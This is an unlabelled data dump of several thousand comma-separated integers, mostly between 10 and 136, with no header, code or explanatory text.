82, 36, 15, 46, 42, 40, 18, 16, 34, 80, 43, 18, 22, 34, 24, 24, 44, 30, 44, 30, 27, 54, 16, 19, 74, 64, 11, 23, 52, 27, 46, 24, 26, 63, 24, 28, 30, 56, 22, 32, 38, 22, 34, 26, 30, 56, 36, 16, 68, 48, 17, 28, 28, 41, 38, 39, 32, 46, 24, 16, 60, 28, 10, 42, 56, 42, 34, 16, 23, 64, 36, 13, 58, 78, 16, 39, 26, 32, 30, 30, 42, 30, 28, 18, 42, 44, 20, 35, 56, 30, 41, 26, 14, 71, 24, 20, 40, 24, 25, 40, 57, 36, 36, 28, 38, 75, 16, 13, 63, 64, 16, 24, 52, 30, 26, 36, 18, 27, 28, 20, 70, 50, 19, 42, 40, 22, 30, 18, 48, 72, 24, 12, 31, 56, 18, 52, 50, 38, 34, 24, 22, 50, 24, 24, 60, 54, 12, 32, 36, 24, 48, 24, 30, 64, 51, 17, 46, 32, 22, 24, 44, 27, 23, 52, 28, 76, 16, 16, 84, 48, 26, 22, 26, 28, 30, 36, 24, 48, 32, 26, 51, 51, 14, 22, 48, 46, 36, 22, 22, 70, 40, 14, 62, 48, 14, 24, 30, 24, 48, 36, 48, 46, 16, 28, 52, 44, 16, 38, 66, 24, 37, 14, 18, 77, 32, 20, 42, 60, 19, 44, 50, 22, 22, 28, 36, 57, 33, 14, 50, 52, 22, 33, 28, 51, 36, 42, 15, 32, 36, 16, 84, 42, 16, 34, 40, 44, 22, 24, 40, 61, 20, 12, 47, 51, 24, 52, 48, 18, 45, 24, 23, 56, 36, 18, 68, 52, 14, 26, 36, 40, 32, 20, 28, 72, 24, 26, 35, 48, 18, 31, 78, 32, 32, 26, 28, 58, 14, 12, 70, 72, 26, 32, 18, 36, 36, 32, 34, 67, 46, 16, 45, 22, 12, 50, 56, 30, 30, 26, 42, 44, 36, 16, 46, 50, 14, 47, 33, 23, 50, 32, 32, 42, 28, 16, 60, 72, 14, 21, 52, 52, 37, 20, 27, 68, 26, 16, 58, 30, 20, 38, 44, 24, 22, 51, 24, 81, 28, 17, 39, 32, 32, 28, 60, 33, 46, 28, 19, 64, 24, 24, 86, 58, 14, 35, 28, 32, 28, 22, 44, 48, 33, 20, 34, 64, 22, 41, 44, 22, 37, 39, 23, 41, 20, 20, 70, 54, 11, 28, 66, 40, 42, 16, 26, 61, 36, 26, 45, 42, 22, 40, 44, 30, 29, 24, 17, 67, 28, 15, 86, 64, 28, 28, 22, 35, 32, 38, 32, 54, 24, 14, 67, 40, 14, 50, 72, 38, 18, 30, 31, 66, 26, 12, 44, 60, 26, 30, 28, 24, 48, 20, 40, 60, 23, 29, 46, 56, 14, 30, 56, 24, 46, 42, 20, 72, 32, 17, 50, 38, 19, 32, 58, 20, 40, 24, 48, 72, 20, 16, 39, 62, 16, 28, 46, 52, 26, 30, 28, 34, 48, 28, 76, 24, 11, 50, 28, 48, 42, 24, 32, 72, 36, 11, 46, 58, 24, 34, 38, 21, 44, 28, 34, 44, 20, 23, 80, 75, 21, 29, 36, 32, 32, 32, 30, 66, 40, 24, 30, 36, 20, 36, 64, 26, 30, 23, 18, 68, 20, 22, 92, 60, 19, 28, 45, 27, 32, 28, 28, 56, 32, 16, 47, 61, 16, 48, 48, 30, 27, 16, 31, 76, 46, 13, 46, 74, 21, 53, 22, 28, 40, 36, 52, 42, 24, 28, 50, 34, 14, 24, 68, 36, 55, 24, 19, 41, 28, 20, 64, 54, 18, 40, 36, 40, 22, 40, 40, 80, 24, 13, 71, 32, 18, 28, 48, 36, 38, 44, 18, 64, 36, 20, 66, 30, 13, 43, 59, 47, 28, 20, 30, 60, 24, 14, 43, 72, 20, 41, 50, 29, 57, 32, 26, 40, 32, 20, 50, 54, 19, 24, 38, 41, 48, 23, 36, 81, 24, 19, 38, 40, 20, 30, 78, 36, 20, 22, 30, 72, 22, 18, 86, 76, 18, 39, 20, 28, 52, 36, 20, 36, 46, 20, 70, 38, 16, 40, 40, 48, 19, 33, 35, 56, 28, 12, 66, 48, 28, 52, 40, 20, 22, 36, 46, 70, 24, 26, 44, 58, 16, 22, 62, 24, 45, 20, 19, 87, 36, 28, 70, 44, 26, 32, 44, 17, 36, 44, 42, 42, 24, 20, 34, 64, 18, 34, 38, 47, 50, 28, 18, 56, 32, 14, 80, 54, 14, 44, 44, 34, 28, 16, 52, 67, 44, 18, 44, 46, 14, 50, 44, 36, 35, 44, 26, 48, 24, 17, 68, 72, 14, 26, 57, 32, 46, 20, 34, 78, 20, 14, 34, 48, 32, 48, 52, 25, 32, 26, 22, 77, 36, 14, 78, 36, 29, 20, 30, 48, 36, 48, 18, 54, 28, 31, 59, 32, 14, 40, 78, 36, 31, 26, 36, 54, 30, 22, 56, 72, 24, 36, 26, 23, 48, 20, 46, 60, 42, 14, 53, 68, 16, 25, 72, 44, 33, 20, 19, 70, 32, 26, 62, 36, 19, 46, 33, 27, 20, 40, 36, 74, 20, 16, 70, 66, 28, 28, 28, 36, 36, 40, 27, 60, 36, 16, 86, 38, 13, 48, 40, 26, 28, 38, 30, 72, 40, 16, 43, 48, 28, 30, 66, 37, 42, 24, 26, 46, 14, 28, 72, 69, 14, 30, 44, 40, 56, 24, 32, 62, 26, 21, 35, 34, 30, 48, 60, 21, 42, 48, 26, 84, 24, 12, 74, 72, 19, 37, 41, 40, 28, 20, 34, 30, 32, 16, 58, 56, 16, 49, 62, 52, 34, 24, 22, 40, 48, 16, 62, 54, 16, 44, 28, 34, 44, 40, 50, 64, 16, 23, 50, 28, 20, 42, 76, 39, 36, 20, 15, 84, 36, 31, 42, 60, 24, 28, 60, 26, 22, 22, 40, 87, 32, 14, 74, 56, 14, 27, 40, 36, 52, 43, 22, 46, 24, 20, 78, 42, 18, 38, 42, 36, 40, 20, 52, 80, 40, 14, 27, 80, 18, 46, 34, 24, 45, 36, 35, 37, 36, 24, 78, 52, 13, 34, 30, 34, 48, 30, 34, 60, 28, 24, 46, 48, 20, 36, 76, 36, 27, 44, 34, 76, 22, 10, 92, 48, 26, 32, 36, 37, 24, 32, 18, 67, 51, 20, 43, 44, 22, 46, 48, 48, 32, 22, 26, 76, 20, 17, 76, 64, 22, 36, 53, 22, 48, 36, 46, 30, 16, 26, 52, 81, 14, 34, 50, 40, 45, 22, 19, 71, 52, 24, 56, 36, 21, 44, 44, 36, 30, 33, 44, 82, 20, 18, 54, 32, 22, 32, 60, 39, 44, 32, 18, 47, 42, 16, 92, 72, 17, 39, 28, 34, 28, 32, 56, 72, 36, 18, 42, 52, 20, 41, 36, 26, 44, 48, 26, 56, 24, 24, 68, 48, 18, 22, 59, 44, 58, 16, 24, 96, 32, 21, 51, 42, 16, 26, 70, 21, 37, 36, 28, 80, 24, 25, 64, 72, 29, 35, 30, 26, 36, 44, 44, 39, 40, 20, 46, 34, 16, 56, 76, 36, 29, 20, 38, 64, 30, 20, 52, 72, 17, 62, 26, 40, 54, 24, 34, 47, 28, 19, 62, 68, 20, 22, 60, 42, 34, 28, 18, 74, 24, 23, 76, 48, 26, 53, 63, 17, 34, 28, 22, 63, 20, 22, 62, 64, 30, 24, 54, 55, 32, 30, 18, 50, 28, 24, 92, 48, 12, 38, 56, 34, 34, 39, 56, 64, 32, 13, 38, 56, 24, 44, 52, 24, 45, 20, 42, 72, 24, 21, 68, 85, 20, 38, 36, 43, 42, 20, 28, 66, 54, 20, 26, 24, 16, 48, 52, 37, 38, 56, 22, 59, 28, 12, 92, 48, 28, 24, 33, 56, 38, 32, 36, 72, 32, 20, 71, 42, 14, 54, 56, 39, 23, 20, 34, 68, 56, 14, 56, 50, 24, 41, 28, 23, 52, 44, 32, 66, 20, 26, 58, 72, 14, 28, 84, 38, 47, 26, 26, 52, 28, 30, 60, 60, 29, 32, 34, 24, 34, 24, 48, 80, 26, 14, 62, 56, 18, 46, 56, 30, 30, 36, 19, 56, 44, 24, 96, 44, 17, 50, 40, 50, 32, 24, 34, 63, 40, 18, 31, 81, 24, 43, 38, 32, 31, 28, 43, 52, 30, 20, 92, 48, 18, 40, 44, 28, 40, 41, 26, 96, 36, 22, 30, 34, 28, 32, 86, 24, 38, 38, 28, 77, 20, 16, 84, 90, 20, 19, 32, 34, 54, 32, 38, 57, 40, 24, 59, 44, 22, 41, 40, 46, 42, 23, 39, 68, 24, 16, 38, 54, 14, 62, 57, 34, 38, 32, 52, 39, 28, 30, 62, 56, 12, 28, 66, 36, 59, 32, 20, 84, 36, 17, 70, 52, 18, 28, 30, 34, 24, 48, 50, 72, 20, 12, 79, 62, 24, 35, 60, 48, 38, 44, 15, 53, 36, 24, 80, 39, 23, 36, 40, 48, 36, 16, 40, 73, 51, 16, 54, 44, 28, 52, 40, 21, 46, 40, 22, 57, 24, 34, 60, 78, 16, 34, 53, 22, 38, 20, 42, 90, 40, 20, 39, 72, 24, 53, 72, 38, 19, 22, 26, 56, 36, 20, 92, 36, 22, 36, 22, 47, 44, 46, 34, 52, 40, 24, 71, 40, 14, 30, 72, 45, 30, 26, 23, 80, 28, 13, 82, 79, 20, 57, 40, 20, 50, 36, 42, 54, 23, 30, 34, 44, 18, 30, 76, 61, 50, 30, 25, 77, 28, 26, 58, 36, 23, 38, 68, 24, 36, 40, 36, 82, 20, 15, 50, 72, 32, 30, 34, 30, 56, 24, 31, 57, 48, 16, 76, 56, 13, 43, 52, 44, 24, 36, 48, 60, 24, 22, 57, 64, 14, 52, 46, 37, 62, 32, 30, 40, 32, 26, 94, 81, 18, 30, 26, 34, 42, 28, 30, 92, 46, 27, 30, 34, 30, 32, 68, 18, 21, 48, 33, 92, 28, 16, 88, 48, 27, 34, 45, 38, 40, 24, 36, 66, 24, 26, 76, 59, 14, 43, 64, 37, 37, 22, 26, 69, 46, 16, 56, 72, 22, 38, 28, 32, 54, 36, 48, 75, 32, 17, 38, 58, 12, 32, 92, 48, 46, 18, 31, 64, 34, 27, 60, 47, 20, 56, 42, 34, 32, 44, 36, 54, 39, 14, 70, 64, 30, 33, 40, 47, 26, 58, 27, 40, 24, 18, 94, 36, 26, 60, 52, 44, 32, 24, 50, 80, 32, 14, 34, 69, 24, 46, 42, 36, 48, 32, 26, 72, 28, 29, 88, 78, 12, 33, 52, 28, 64, 26, 24, 45, 28, 26, 47, 34, 32, 48, 78, 32, 37, 24, 28, 88, 24, 16, 80, 78, 20, 34, 34, 52, 36, 24, 44, 60, 53, 24, 70, 32, 10, 58, 44, 36, 37, 42, 27, 64, 36, 15, 72, 74, 34, 27, 39, 28, 40, 40, 58, 42, 20, 20, 54, 76, 16, 41, 62, 42, 35, 30, 19, 92, 48, 26, 62, 42, 29, 38, 60, 34, 32, 28, 38, 106, 20, 19, 70, 40, 24, 24, 68, 30, 46, 42, 20, 52, 30, 20, 72, 78, 22, 60, 46, 31, 38, 20, 44, 72, 40, 14, 35, 64, 24, 60, 56, 40, 44, 36, 37, 29, 28, 24, 88, 48, 14, 32, 66, 56, 44, 28, 26, 82, 24, 23, 47, 64, 28, 40, 60, 36, 30, 32, 22, 84, 28, 14, 98, 44, 31, 38, 28, 41, 46, 54, 20, 60, 48, 24, 47, 40, 18, 45, 88, 40, 39, 20, 38, 76, 38, 20, 80, 78, 14, 42, 32, 24, 40, 48, 56, 59, 21, 31, 52, 46, 18, 28, 48, 36, 68, 28, 31, 92, 32, 25, 56, 60, 17, 32, 53, 28, 32, 32, 52, 78, 36, 18, 62, 72, 22, 23, 34, 53, 50, 42, 18, 40, 58, 20, 100, 36, 20, 52, 28, 56, 24, 33, 58, 85, 32, 15, 46, 46, 20, 64, 72, 24, 46, 32, 22, 74, 26, 18, 64, 80, 26, 29, 58, 40, 40, 18, 34, 72, 39, 32, 58, 56, 22, 24, 76, 40, 40, 57, 34, 56, 16, 20, 88, 60, 21, 44, 40, 24, 58, 32, 22, 60, 32, 23, 63, 51, 16, 58, 64, 48, 29, 20, 39, 72, 60, 24, 58, 66, 24, 41, 22, 28, 54, 44, 46, 54, 24, 16, 73, 68, 20, 38, 68, 52, 36, 26, 23, 87, 20, 24, 68, 45, 27, 38, 52, 20, 32, 48, 48, 96, 44, 20, 50, 54, 20, 26, 56, 54, 32, 38, 18, 77, 28, 24, 110, 44, 14, 41, 66, 35, 40, 24, 60, 60, 32, 20, 30, 88, 28, 50, 44, 26, 54, 28, 42, 56, 44, 22, 56, 54, 19, 46, 46, 28, 48, 36, 30, 80, 32, 33, 50, 40, 26, 64, 68, 27, 32, 24, 26, 80, 20, 13, 110, 96, 30, 30, 28, 46, 40, 34, 38, 42, 45, 20, 90, 48, 20, 47, 72, 43, 26, 36, 27, 63, 48, 24, 54, 54, 20, 42, 33, 48, 50, 24, 34, 68, 24, 35, 68, 84, 16, 24, 82, 30, 57, 20, 22, 67, 40, 27, 66, 60, 22, 56, 28, 23, 40, 46, 52, 93, 20, 14, 49, 64, 24, 34, 72, 58, 45, 30, 31, 40, 44, 24, 84, 51, 16, 56, 28, 57, 36, 28, 38, 78, 56, 14, 51, 46, 20, 40, 52, 30, 53, 54, 43, 72, 20, 25, 78, 52, 19, 36, 72, 28, 34, 32, 32, 90, 40, 24, 43, 31, 24, 36, 76, 40, 42, 36, 28, 88, 24, 14, 102, 72, 27, 32, 36, 48, 52, 60, 32, 56, 24, 28, 54, 46, 26, 38, 66, 30, 25, 26, 38, 81, 32, 16, 74, 96, 18, 55, 36, 28, 44, 20, 58, 48, 39, 34, 58, 64, 18, 40, 56, 52, 54, 26, 15, 80, 48, 16, 72, 48, 34, 28, 69, 37, 22, 32, 44, 96, 24, 13, 71, 64, 32, 48, 36, 33, 36, 44, 18, 76, 48, 34, 92, 42, 23, 44, 44, 32, 36, 36, 44, 60, 32, 18, 50, 68, 20, 44, 72, 39, 62, 32, 30, 35, 20, 26, 78, 84, 16, 38, 50, 48, 64, 20, 46, 108, 48, 18, 31, 34, 18, 54, 72, 30, 26, 50, 36, 67, 36, 19, 92, 64, 18, 47, 46, 40, 54, 40, 28, 39, 40, 22, 55, 72, 16, 50, 40, 67, 32, 28, 46, 68, 28, 16, 84, 42, 33, 58, 42, 24, 36, 36, 52, 64, 28, 22, 60, 64, 18, 32, 96, 30, 62, 20, 19, 100, 32, 29, 72, 76, 22, 43, 42, 28, 26, 42, 40, 78, 33, 22, 54, 68, 36, 30, 40, 37, 38, 39, 31, 76, 40, 20, 98, 48, 13, 64, 70, 48, 26, 20, 58, 76, 32, 23, 52, 58, 20, 50, 38, 33, 59, 32, 31, 37, 48, 28, 88, 78, 16, 25, 36, 51, 54, 44, 30, 78, 32, 22, 62, 32, 32, 44, 96, 33, 35, 42, 22, 82, 22, 20, 84, 72, 23, 28, 36, 57, 48, 32, 24, 72, 44, 20, 63, 44, 22, 36, 76, 36, 45, 36, 42, 80, 32, 16, 42, 74, 30, 58, 33, 28, 64, 36, 60, 69, 24, 20, 58, 95, 14, 43, 82, 44, 42, 24, 23, 58, 36, 30, 68, 36, 22, 52, 50, 40, 38, 54, 48, 75, 28, 17, 86, 44, 26, 24, 52, 54, 30, 42, 26, 68, 34, 24, 100, 67, 16, 46, 40, 29, 36, 22, 40, 93, 66, 18, 35, 72, 24, 52, 52, 36, 50, 40, 31, 62, 24, 32, 100, 48, 17, 24, 53, 24, 64, 28, 48, 81, 36, 38, 38, 69, 24, 48, 68, 24, 34, 32, 28, 104, 46, 13, 92, 76, 22, 37, 46, 52, 30, 28, 44, 48, 32, 34, 52, 34, 18, 72, 78, 64, 39, 24, 22, 46, 42, 14, 78, 84, 32, 44, 26, 32, 58, 40, 52, 78, 26, 21, 73, 46, 24, 48, 64, 36, 40, 42, 26, 87, 24, 26, 52, 50, 40, 28, 84, 39, 32, 36, 26, 84, 20, 24, 87, 88, 22, 34, 52, 40, 52, 42, 20, 46, 54, 26, 90, 30, 20, 48, 36, 47, 40, 32, 54, 96, 48, 20, 43, 68, 20, 54, 76, 30, 33, 28, 38, 68, 22, 21, 96, 87, 15, 31, 42, 40, 58, 28, 34, 72, 56, 22, 58, 48, 26, 43, 48, 25, 37, 63, 36, 82, 24, 22, 102, 60, 27, 26, 42, 48, 36, 44, 38, 75, 40, 24, 74, 32, 20, 42, 80, 54, 34, 20, 35, 88, 28, 19, 74, 80, 18, 58, 38, 23, 46, 54, 52, 54, 24, 26, 34, 80, 26, 34, 90, 51, 62, 20, 22, 86, 40, 22, 48, 69, 28, 58, 50, 34, 42, 24, 52, 74, 42, 19, 73, 32, 22, 42, 40, 48, 59, 56, 19, 56, 32, 20, 116, 66, 14, 61, 52, 44, 36, 28, 64, 60, 36, 16, 54, 81, 30, 48, 52, 30, 41, 34, 35, 65, 36, 28, 62, 48, 20, 28, 62, 56, 52, 33, 32, 111, 28, 20, 42, 54, 18, 48, 96, 21, 45, 52, 46, 77, 24, 30, 88, 83, 29, 34, 26, 29, 52, 36, 44, 48, 46, 20, 63, 60, 14, 50, 56, 66, 34, 33, 30, 80, 52, 18, 84, 36, 18, 50, 36, 37, 72, 32, 46, 72, 32, 21, 54, 81, 20, 22, 72, 48, 35, 28, 30, 92, 54, 24, 82, 44, 41, 64, 52, 28, 24, 50, 32, 102, 24, 16, 58, 48, 30, 31, 68, 60, 40, 30, 23, 59, 36, 24, 118, 72, 19, 44, 56, 48, 26, 32, 40, 66, 45, 26, 47, 70, 28, 66, 36, 24, 67, 36, 31, 54, 24, 28, 94, 74, 19, 48, 78, 32, 40, 20, 38, 69, 36, 28, 54, 72, 24, 40, 60, 46, 36, 32, 34, 76, 38, 14, 110, 78, 28, 26, 28, 44, 38, 63, 46, 78, 24, 16, 86, 32, 22, 62, 84, 36, 30, 34, 27, 92, 50, 20, 44, 85, 28, 49, 36, 26, 62, 32, 46, 66, 36, 38, 62, 48, 12, 23, 92, 48, 62, 39, 28, 76, 28, 42, 60, 36, 30, 56, 53, 36, 36, 28, 52, 102, 28, 15, 47, 84, 24, 46, 62, 51, 52, 36, 22, 67, 56, 24, 90, 50, 15, 54, 34, 41, 46, 26, 56, 48, 44, 14, 66, 80, 32, 37, 66, 38, 37, 40, 43, 52, 20, 30, 96, 84, 18, 52, 56, 41, 40, 24, 24, 103, 46, 30, 58, 32, 34, 32, 76, 33, 39, 42, 28, 108, 24, 21, 106, 84, 24, 33, 59, 34, 58, 36, 36, 51, 28, 28, 70, 62, 20, 64, 48, 39, 39, 26, 38, 82, 54, 14, 56, 72, 20, 52, 36, 40, 44, 56, 68, 40, 32, 26, 44, 58, 18, 42, 78, 48, 67, 34, 19, 94, 32, 22, 88, 72, 26, 40, 36, 35, 38, 42, 58, 87, 28, 16, 79, 48, 32, 53, 64, 52, 48, 56, 26, 44, 40, 24, 82, 30, 19, 36, 78, 57, 36, 28, 46, 110, 32, 22, 39, 90, 18, 46, 42, 36, 64, 28, 45, 60, 28, 25, 96, 94, 18, 30, 46, 32, 60, 36, 34, 90, 40, 26, 35, 54, 22, 48, 104, 30, 35, 28, 38, 65, 36, 26, 110, 48, 27, 52, 26, 60, 42, 32, 28, 75, 63, 33, 76, 58, 20, 48, 64, 33, 23, 28, 42, 88, 36, 14, 82, 72, 22, 63, 46, 28, 42, 32, 46, 72, 32, 34, 55, 84, 28, 32, 66, 52, 66, 24, 19, 80, 44, 38, 80, 48, 23, 28, 54, 27, 54, 63, 32, 88, 28, 21, 71, 72, 24, 32, 72, 39, 50, 34, 35, 76, 42, 20, 88, 79, 14, 55, 60, 44, 26, 22, 72, 60, 53, 16, 36, 44, 24, 71, 40, 46, 63, 60, 26, 53, 24, 24, 92, 66, 22, 42, 52, 56, 40, 28, 50, 94, 32, 18, 59, 36, 36, 52, 84, 30, 34, 52, 28, 104, 42, 21, 96, 60, 27, 31, 28, 41, 52, 50, 34, 72, 44, 24, 91, 56, 16, 44, 84, 51, 27, 26, 30, 64, 36, 18, 58, 99, 32, 58, 28, 27, 54, 28, 72, 78, 40, 20, 66, 68, 14, 40, 68, 48, 29, 38, 34, 100, 36, 42, 76, 38, 28, 44, 66, 32, 48, 44, 32, 60, 32, 16, 87, 96, 32, 23, 46, 64, 53, 42, 23, 46, 56, 20, 110, 36, 18, 66, 40, 56, 38, 42, 44, 104, 28, 26, 47, 34, 22, 52, 84, 39, 52, 34, 34, 64, 22, 27, 96, 97, 19, 33, 68, 34, 62, 28, 42, 78, 30, 22, 30, 72, 30, 52, 72, 38, 44, 36, 45, 100, 20, 14, 86, 72, 34, 40, 53, 48, 40, 32, 32, 59, 52, 28, 78, 51, 14, 70, 64, 33, 54, 32, 30, 76, 68, 20, 78, 76, 34, 44, 28, 38, 34, 46, 54, 66, 20, 34, 62, 54, 20, 35, 102, 36, 53, 26, 22, 106, 56, 20, 80, 66, 27, 40, 42, 36, 34, 36, 40, 117, 26, 30, 81, 64, 32, 26, 48, 36, 50, 66, 30, 37, 36, 36, 86, 64, 22, 59, 40, 41, 50, 24, 66, 84, 32, 16, 44, 96, 16, 65, 66, 42, 40, 28, 42, 58, 48, 32, 104, 60, 17, 44, 46, 44, 52, 40, 34, 74, 44, 19, 51, 40, 32, 50, 86, 36, 41, 36, 34, 104, 18, 16, 116, 96, 36, 36, 38, 44, 36, 42, 30, 54, 59, 20, 71, 44, 22, 55, 80, 74, 30, 33, 31, 69, 32, 24, 86, 72, 26, 52, 66, 28, 72, 28, 46, 66, 20, 35, 46, 80, 24, 40, 52, 36, 66, 24, 27, 117, 52, 23, 48, 50, 24, 64, 70, 33, 32, 48, 62, 72, 40, 20, 76, 64, 20, 37, 60, 54, 38, 48, 29, 64, 26, 20, 118, 54, 22, 36, 46, 54, 42, 36, 72, 96, 51, 14, 51, 58, 28, 46, 40, 27, 62, 60, 26, 92, 32, 26, 82, 74, 23, 30, 73, 48, 66, 24, 32, 90, 24, 40, 51, 72, 26, 48, 90, 32, 30, 52, 40, 64, 28, 22, 90, 48, 29, 36, 38, 40, 66, 36, 36, 96, 48, 20, 67, 44, 18, 60, 96, 60, 36, 18, 38, 54, 34, 27, 76, 104, 20, 65, 36, 40, 56, 44, 34, 45, 36, 28, 74, 84, 18, 32, 76, 58, 58, 45, 22, 64, 32, 24, 96, 30, 29, 64, 78, 34, 24, 48, 52, 109, 32, 20, 58, 72, 36, 34, 60, 48, 40, 28, 22, 88, 48, 28, 122, 48, 17, 59, 40, 37, 38, 44, 66, 84, 36, 18, 46, 74, 30, 49, 48, 32, 70, 32, 51, 58, 32, 24, 60, 99, 13, 32, 50, 64, 52, 28, 42, 101, 68, 34, 58, 34, 24, 48, 72, 33, 53, 36, 22, 81, 36, 15, 118, 72, 22, 33, 45, 59, 34, 56, 44, 72, 36, 24, 71, 64, 22, 61, 64, 33, 35, 36, 31, 76, 58, 24, 68, 54, 30, 62, 44, 27, 60, 36, 60, 81, 20, 28, 86, 68, 16, 36, 116, 36, 59, 36, 22, 92, 28, 36, 66, 93, 37, 44, 36, 20, 40, 30, 50, 87, 51, 22, 67, 72, 32, 47, 44, 64, 44, 36, 23, 53, 36, 30, 100, 42, 20, 54, 66, 56, 48, 32, 52, 80, 40, 13, 71, 102, 26, 56, 44, 30, 31, 40, 50, 74, 32, 19, 100, 72, 23, 31, 60, 32, 50, 38, 38, 102, 40, 36, 31, 48, 36, 45, 102, 52, 40, 38, 26, 110, 28, 18, 116, 72, 21, 32, 50, 54, 68, 40, 48, 50, 41, 32, 38, 34, 20, 62, 76, 48, 35, 42, 36, 100, 44, 18, 64, 80, 20, 71, 52, 28, 62, 32, 66, 48, 28, 30, 78, 81, 18, 44, 56, 67, 72, 24, 23, 65, 54, 20, 90, 60, 26, 38, 44, 48, 26, 73, 52, 92, 20, 24, 94, 44, 34, 52, 64, 33, 52, 32, 22, 67, 50, 24, 108, 75, 26, 62, 44, 46, 32, 20, 32, 90, 60, 18, 59, 84, 20, 41, 68, 33, 59, 59, 42, 56, 28, 28, 78, 84, 24, 46, 66, 34, 56, 20, 46, 104, 32, 33, 44, 56, 36, 52, 86, 30, 29, 36, 45, 92, 28, 20, 108, 80, 23, 38, 28, 64, 52, 72, 30, 54, 44, 18, 87, 54, 24, 39, 82, 64, 40, 22, 55, 96, 32, 18, 82, 54, 32, 64, 36, 40, 52, 52, 36, 75, 51, 24, 38, 46, 24, 36, 100, 36, 58, 40, 19, 107, 36, 35, 82, 60, 24, 36, 73, 29, 44, 48, 56, 81, 20, 20, 82, 96, 30, 39, 56, 58, 54, 30, 34, 76, 56, 28, 112, 60, 15, 68, 40, 44, 26, 23, 50, 78, 52, 27, 46, 40, 28, 66, 66, 36, 50, 40, 38, 68, 42, 33, 98, 106, 24, 27, 50, 28, 48, 22, 46, 108, 46, 26, 58, 48, 22, 64, 76, 32, 25, 69, 34, 107, 24, 22, 98, 60, 38, 38, 57, 68, 52, 28, 38, 82, 32, 32, 86, 72, 14, 42, 56, 45, 55, 28, 34, 68, 54, 23, 76, 78, 31, 44, 38, 28, 74, 40, 68, 54, 28, 24, 62, 88, 14, 53, 116, 64, 49, 26, 36, 52, 36, 30, 60, 54, 30, 68, 42, 34, 54, 48, 46, 103, 39, 15, 70, 68, 28, 40, 36, 57, 50, 56, 23, 76, 40, 16, 122, 58, 23, 62, 84, 34, 32, 32, 50, 84, 52, 24, 35, 88, 24, 47, 76, 50, 68, 28, 26, 65, 28, 34, 114, 60, 22, 26, 46, 56, 64, 33, 46, 108, 32, 38, 43, 58, 32, 32, 92, 24, 38, 38, 30, 117, 40, 20, 98, 104, 24, 54, 36, 34, 38, 46, 48, 39, 63, 32, 92, 36, 20, 65, 52, 56, 47, 48, 42, 64, 48, 22, 78, 78, 24, 48, 33, 37, 48, 48, 52, 92, 24, 26, 92, 84, 26, 42, 84, 42, 40, 24, 27, 116, 56, 34, 46, 38, 34, 40, 62, 38, 44, 48, 56, 84, 20, 22, 90, 56, 30, 44, 90, 37, 54, 52, 21, 65, 26, 24, 102, 84, 23, 70, 40, 56, 36, 28, 76, 102, 46, 13, 54, 80, 26, 48, 68, 36, 57, 42, 51, 47, 28, 31, 96, 64, 15, 54, 61, 52, 72, 24, 24, 78, 56, 32, 58, 76, 24, 44, 62, 54, 34, 40, 30, 90, 48, 18, 114, 60, 32, 40, 36, 37, 34, 60, 36, 88, 52, 34, 70, 32, 16, 46, 86, 60, 46, 24, 43, 112, 30, 20, 88, 111, 18, 48, 42, 20, 78, 44, 68, 45, 40, 36, 62, 84, 22, 38, 52, 36, 57, 33, 34, 106, 48, 22, 82, 42, 21, 58, 90, 44, 40, 36, 58, 108, 28, 21, 60, 79, 20, 50, 52, 54, 38, 44, 29, 57, 66, 20, 122, 60, 32, 49, 52, 53, 38, 48, 54, 72, 32, 18, 43, 80, 42, 82, 72, 46, 52, 32, 26, 46, 26, 38, 96, 69, 22, 26, 74, 48, 58, 28, 24, 109, 42, 31, 75, 44, 26, 58, 96, 30, 50, 60, 28, 92, 20, 21, 108, 76, 45, 36, 33, 52, 56, 28, 34, 78, 44, 24, 43, 81, 22, 60, 90, 64, 36, 28, 51, 76, 68, 22, 80, 60, 18, 76, 30, 40, 58, 52, 56, 70, 28, 26, 68, 58, 18, 34, 96, 51, 52, 42, 38, 94, 28, 24, 98, 72, 29, 52, 56, 29, 42, 42, 40, 114, 36, 20, 71, 64, 32, 25, 60, 61, 66, 57, 22, 72, 28, 40, 108, 60, 15, 38, 72, 44, 40, 28, 68, 74, 52, 20, 43, 81, 40, 68, 42, 21, 78, 32, 42, 92, 36, 25, 72, 102, 18, 59, 62, 44, 56, 32, 44, 87, 32, 24, 62, 48, 28, 44, 98, 50, 33, 40, 33, 59, 40, 24, 128, 108, 34, 32, 36, 64, 48, 32, 46, 66, 44, 24, 95, 34, 24, 76, 72, 36, 37, 48, 34, 111, 44, 22, 66, 80, 28, 45, 66, 28, 42, 28, 62, 63, 28, 32, 78, 112, 18, 41, 84, 44, 74, 36, 28, 92, 44, 32, 54, 42, 41, 60, 38, 37, 42, 63, 52, 116, 32, 18, 54, 56, 22, 38, 90, 42, 54, 44, 26, 72, 58, 33, 120, 50, 15, 61, 44, 68, 38, 28, 60, 84, 57, 24, 71, 68, 24, 58, 32, 59, 49, 56, 46, 68, 32, 24, 112, 48, 25, 40, 79, 36, 60, 40, 28, 121, 40, 26, 43, 60, 46, 38, 78, 39, 36, 36, 28, 97, 36, 20, 136, 94, 30, 33, 38, 34, 44, 68, 38, 42, 28, 34, 82, 72, 24, 74, 96, 47, 52, 20, 39, 76, 40, 14, 84, 96, 31, 56, 40, 51, 36, 32, 60, 80, 53, 37, 60, 68, 20, 48, 72, 48, 62, 30, 23, 100, 44, 26, 100, 78, 28, 57, 68, 26, 28, 52, 60, 90, 20, 16, 86, 62, 32, 51, 56, 50, 42, 52, 31, 58, 72, 32, 82, 36, 22, 54, 66, 72, 52, 28, 52, 108, 32, 19, 62, 68, 20, 52, 86, 30, 74, 36, 42, 74, 28, 30, 66, 111, 18, 50, 50, 44, 76, 24, 50, 93, 64, 28, 38, 60, 28, 52, 96, 42, 31, 46, 36, 86, 32, 22, 112, 60, 29, 46, 33, 67, 76, 48, 44, 50, 40, 20, 102, 80, 28, 38, 56, 54, 31, 40, 35, 96, 36, 21, 98, 80, 22, 73, 40, 26, 58, 72, 52, 66, 40, 36, 68, 48, 22, 28, 108, 64, 46, 22, 19, 119, 28, 38, 86, 78, 28, 36, 74, 28, 38, 28, 62, 112, 51, 17, 86, 64, 32, 34, 52, 48, 52, 56, 38, 74, 48, 28, 94, 50, 22, 69, 46, 46, 32, 28, 64, 84, 52, 32, 50, 96, 18, 68, 44, 40, 81, 48, 30, 50, 40, 24, 120, 66, 22, 36, 58, 64, 58, 43, 52, 111, 32, 26, 43, 40, 32, 56, 114, 36, 34, 46, 36, 124, 34, 18, 90, 88, 39, 44, 36, 56, 64, 44, 32, 90, 46, 28, 78, 48, 18, 55, 88, 39, 48, 48, 46, 46, 36, 24, 68, 72, 26, 52, 59, 40, 60, 40, 